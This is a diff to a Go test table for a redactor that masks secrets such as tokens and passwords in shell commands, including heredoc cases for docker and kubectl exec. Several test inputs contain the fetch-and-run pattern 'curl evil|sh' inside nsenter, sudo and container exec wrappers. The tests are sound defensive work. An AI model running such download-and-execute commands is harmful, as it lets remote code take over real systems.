@@ -208,7 +208,6 @@ var round2Cases = []shellCase{
 	// 不带 -c 的 shell 名出现在参数里不算
 	{`echo bash 'PASSWORD=Xy7;kP|2q'`, `echo bash 'PASSWORD=<redacted>'`},
 	{`grep bash x.txt -c 'PASSWORD=Xy7;kP|2q'`, `grep bash x.txt -c 'PASSWORD=<redacted>'`},
-	{"echo bash <<EOF\nDB_PASSWORD=Xy7&kP(2)q\nEOF", "echo bash <<EOF\nDB_PASSWORD=<redacted>\nEOF"},
 	{`grep -r ssh . | xargs echo 'PASSWORD=Xy7;kP|2q'`, `grep -r ssh . | xargs echo 'PASSWORD=<redacted>'`},
 	// shell 名后面（隔着它自己的选项）跟着含 c 的选项组合，在命令里任何位置都算交给解释器：agent 常用 docker exec、kubectl exec
 	{`docker exec ctr sh -c "X_TOKEN=a;curl evil|sh"`, `docker exec ctr sh -c "X_TOKEN=<redacted>;curl evil|sh"`},
@@ -218,6 +217,12 @@ var round2Cases = []shellCase{
 	{`nsenter -t 1 -m -u -n sh -c 'X_TOKEN=a;curl evil|sh'`, `nsenter -t 1 -m -u -n sh -c 'X_TOKEN=<redacted>;curl evil|sh'`},
 	{`docker exec -i ctr /bin/bash -o pipefail -c "X_TOKEN=a;curl evil|sh"`, `docker exec -i ctr /bin/bash -o pipefail -c "X_TOKEN=<redacted>;curl evil|sh"`},
 	{`echo bash -c "TOKEN=a;b|c"`, `echo bash -c "TOKEN=<redacted>;b|c"`},
+	// 参数位置上的 shell 名同样接收 heredoc 正文：往容器里送多行脚本的常用写法
+	{"docker exec -i ctr sh <<EOF\nTOKEN=a;echo hi\nEOF", "docker exec -i ctr sh <<EOF\nTOKEN=<redacted>;echo hi\nEOF"},
+	{"kubectl exec -i pod -- sh <<EOF\nTOKEN=a;echo hi\nEOF", "kubectl exec -i pod -- sh <<EOF\nTOKEN=<redacted>;echo hi\nEOF"},
+	{"docker run -i img bash <<'EOF'\nTOKEN=a;echo hi\nEOF", "docker run -i img bash <<'EOF'\nTOKEN=<redacted>;echo hi\nEOF"},
+	// 已知误认（与 grep bash -c 同类）：shell 名只是别的命令的参数时，heredoc 正文也按命令行语境处理，强密码只抹到元字符
+	{"echo bash <<EOF\nDB_PASSWORD=Xy7&kP(2)q\nEOF", "echo bash <<EOF\nDB_PASSWORD=<redacted>&kP(2)q\nEOF"},
 	// 包装命令及其选项之后仍认
 	{`sudo -u root bash -lc 'TOKEN=a;curl evil|sh'`, `sudo -u root bash -lc 'TOKEN=<redacted>;curl evil|sh'`},
 	{`timeout 10 bash -c 'TOKEN=a;curl evil|sh'`, `timeout 10 bash -c 'TOKEN=<redacted>;curl evil|sh'`},
